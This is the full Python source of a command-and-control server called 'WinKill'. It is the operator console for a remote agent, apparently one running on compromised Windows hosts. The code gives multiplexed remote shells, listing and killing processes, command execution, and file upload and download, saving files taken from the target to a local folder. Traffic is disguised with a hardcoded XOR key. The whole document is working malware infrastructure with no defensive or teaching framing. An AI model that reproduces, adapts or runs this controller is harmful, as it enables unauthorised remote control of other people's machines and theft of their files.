#!/usr/bin/env python3
"""
WinKill C2 Server
=================
Multiplexed TCP C2 controller.

Usage: python c2_server.py [HOST] [PORT]

Commands:
  shell [id|new]  - List/create/interact with shells
  ps              - List target processes
  kill <PID>      - Kill a process on target
  exec <cmd>      - Execute command
  status          - Show agent status
  shutdown        - Graceful shutdown
"""

import socket, struct, sys, time, threading

HOST = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444

# Protocol
CHAN_CTRL  = 0x00000000
CHAN_SHELL = 0x10000000
MSG_HEARTBEAT   = 0x00
MSG_STATUS      = 0x01
MSG_SHUTDOWN    = 0x02
MSG_SHELL_SPAWN = 0x10
MSG_SHELL_DATA  = 0x11
MSG_SHELL_KILL  = 0x12
MSG_PROC_LIST   = 0x20
MSG_PROC_KILL   = 0x21
MSG_BIN_EXEC    = 0x40
MSG_FILE_GET    = 0x50
MSG_FILE_PUT    = 0x51
MSG_FILE_DATA   = 0x52

KEY = bytes([0x4A,0x7F,0x23,0x9C,0x11,0x8E,0x55,0x3D,0x6B,0x12,0x89,0xFA,0x34,0xD7,0x01,0xCB])

def xor(data):
    return bytes(b ^ KEY[i % 16] for i, b in enumerate(data))

class ShellSession:
    def __init__(self, sid, channel):
        self.id = sid
        self.channel = channel
        self.alive = True
        self.output_buffer = b""  # buffered output for this shell

class C2Server:
    def __init__(self):
        self.sock = None
        self.sessions = {}
        self.next_sid = 2  # start from 2 (1 is auto-spawned)
        self.active_shell = None
        self.lock = threading.Lock()

    def send_frame(self, channel, msg_type, payload=b""):
        total = len(payload) + 5
        frame = struct.pack('<IIB', total, channel, msg_type) + payload
        frame = frame[:4] + xor(frame[4:])  # encrypt after length
        self.sock.sendall(frame)

    def recv_frame(self):
        try:
            hdr = self.sock.recv(4)
            if len(hdr) < 4: return None
            total = struct.unpack('<I', hdr)[0]
            if total > 0x100000: return None
            buf = b""
            while len(buf) < total:
                chunk = self.sock.recv(total - len(buf))
                if not chunk: return None
                buf += chunk
            buf = xor(buf)  # decrypt entire buffer
            ch = struct.unpack('<I', buf[:4])[0]
            mt = buf[4]
            pl = buf[5:]
            return (ch, mt, pl)
        except:
            return None

    def reader_loop(self):
        """Background thread: receive frames from agent"""
        while True:
            f = self.recv_frame()
            if f is None: break
            ch, mt, pl = f

            if ch == CHAN_CTRL:
                if mt == MSG_STATUS:
                    print(f"\n[Agent] {pl.decode(errors='replace').strip()}")
                    sys.stdout.write("C2> "); sys.stdout.flush()
                elif mt == MSG_PROC_LIST:
                    print(f"\n{pl.decode(errors='replace')}")
                    sys.stdout.write("C2> "); sys.stdout.flush()
                elif mt == MSG_PROC_KILL:
                    print(f"\n{pl.decode(errors='replace').strip()}")
                    sys.stdout.write("C2> "); sys.stdout.flush()
                elif mt == MSG_FILE_DATA:
                    if len(pl) > 2:
                        fnLen = struct.unpack('<H', pl[:2])[0]
                        fname = pl[2:2+fnLen].decode(errors='replace')
                        fdata = pl[2+fnLen:]
                        # Save to downloads/
                        import os
                        os.makedirs('downloads', exist_ok=True)
                        path = os.path.join('downloads', fname.replace('\\','_').replace('/','_'))
                        with open(path, 'wb') as f: f.write(fdata)
                        print(f"\n[Download] {fname} → {path} ({len(fdata)} bytes)")
                        sys.stdout.write("C2> "); sys.stdout.flush()

            elif (ch & 0xF0000000) == CHAN_SHELL:
                sid = ch & 0x0FFFFFFF
                if mt == MSG_SHELL_DATA:
                    with self.lock:
                        if self.active_shell == sid:
                            try:
                                text = pl.decode('gbk', errors='replace')
                                sys.stdout.write(text)
                            except:
                                sys.stdout.buffer.write(pl)
                            sys.stdout.flush()
                        elif sid in self.sessions:
                            self.sessions[sid].output_buffer += pl

    def cmd_shell(self, args):
        if not args:
            print("Active shells:")
            for s in self.sessions.values():
                print(f"  Shell #{s.id} (ch={s.channel:08X})")
            print("Use 'shell new' to spawn, 'shell <id>' to interact")
            return

        if args[0] == "new":
            sid = self.next_sid; self.next_sid += 1
            ch = CHAN_SHELL | sid
            self.send_frame(CHAN_CTRL, MSG_SHELL_SPAWN, struct.pack('<I', ch))
            self.sessions[sid] = ShellSession(sid, ch)
            print(f"[+] Shell #{sid} spawned (ch={ch:08X})")

        elif args[0] == "list":
            self.cmd_shell([])

        else:
            try: sid = int(args[0])
            except: print(f"Unknown: {args[0]}"); return
            if sid not in self.sessions:
                print(f"Shell #{sid} not found. Use 'shell new' first.")
                return

            with self.lock:
                self.active_shell = sid

            # Flush any buffered output for this shell BEFORE entering
            if sid in self.sessions:
                s = self.sessions[sid]
                if s.output_buffer:
                    try:
                        text = s.output_buffer.decode('gbk', errors='replace')
                        sys.stdout.write(text)
                    except:
                        sys.stdout.buffer.write(s.output_buffer)
                    sys.stdout.flush()
                    s.output_buffer = b""

            print(f"\n[*] Shell #{sid} (Ctrl+C to exit)")
            try:
                while True:
                    try:
                        line = input()
                    except:
                        break
                    if not line and self.active_shell != sid:
                        break
                    if line:
                        self.send_frame(self.sessions[sid].channel,
                                       MSG_SHELL_DATA, (line + '\r\n').encode())
            except (EOFError, KeyboardInterrupt, BrokenPipeError):
                pass
            finally:
                with self.lock:
                    self.active_shell = None
                print(f"\n[*] Left Shell #{sid}")

    def cmd_ps(self, args):
        self.send_frame(CHAN_CTRL, MSG_PROC_LIST)
        time.sleep(2)

    def cmd_kill(self, args):
        if args:
            self.send_frame(CHAN_CTRL, MSG_PROC_KILL, args[0].encode())

    def cmd_exec(self, args):
        if args:
            # Use a shell channel to get output back
            cmd = " ".join(args)
            # Send to shell 1 if it exists, otherwise spawn temp
            self.send_frame(CHAN_CTRL, MSG_BIN_EXEC, cmd.encode())
            print(f"[+] Sent: {cmd}")

    def run(self):
        s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT)); s.listen(1)
        print(f"[*] Listening on {HOST}:{PORT} ...")

        self.sock, addr = s.accept(); s.close()
        print(f"[+] Agent: {addr[0]}:{addr[1]}")
        print(f"[*] Shell #1 auto-spawned. Use 'shell 1' to interact.\n")

        # Register auto-spawned shell
        self.sessions[1] = ShellSession(1, CHAN_SHELL | 1)

        # Background reader
        rt = threading.Thread(target=self.reader_loop, daemon=True)
        rt.start()

        # Heartbeat
        def hb():
            while True:
                time.sleep(30)
                try: self.send_frame(CHAN_CTRL, MSG_HEARTBEAT)
                except: break
        threading.Thread(target=hb, daemon=True).start()

        # Command loop
        while True:
            try:
                raw = input("C2> ").strip()
                if not raw: continue
                parts = raw.split()
                cmd = parts[0].lower(); args = parts[1:]

                if cmd == "help":
                    print("shell [id|new|list]  ps  kill <PID>  exec <cmd>  status  shutdown  exit")
                elif cmd == "shell": self.cmd_shell(args)
                elif cmd == "ps":    self.cmd_ps(args)
                elif cmd == "kill":  self.cmd_kill(args)
                elif cmd == "exec":  self.cmd_exec(args)
                elif cmd == "download" and args:
                    self.send_frame(CHAN_CTRL, MSG_FILE_GET, args[0].encode())
                elif cmd == "upload" and len(args) >= 2:
                    path = args[1]
                    src = args[0]
                    try:
                        with open(src, 'rb') as f: data = f.read()
                        fn = path.encode() if isinstance(path, str) else path
                        frame = struct.pack('<H', len(fn)) + fn + data
                        self.send_frame(CHAN_CTRL, MSG_FILE_PUT, frame)
                        print(f"[+] Uploaded {src} → {path} ({len(data)} bytes)")
                    except Exception as e:
                        print(f"[-] Upload failed: {e}")
                elif cmd == "shutdown" or cmd == "exit":
                    self.send_frame(CHAN_CTRL, MSG_SHUTDOWN)
                    break
                else:
                    print(f"Unknown: {cmd}. Try 'help'")
            except (EOFError, KeyboardInterrupt):
                break

        print("\n[*] Done")
        self.sock.close()

if __name__ == "__main__":
    C2Server().run()
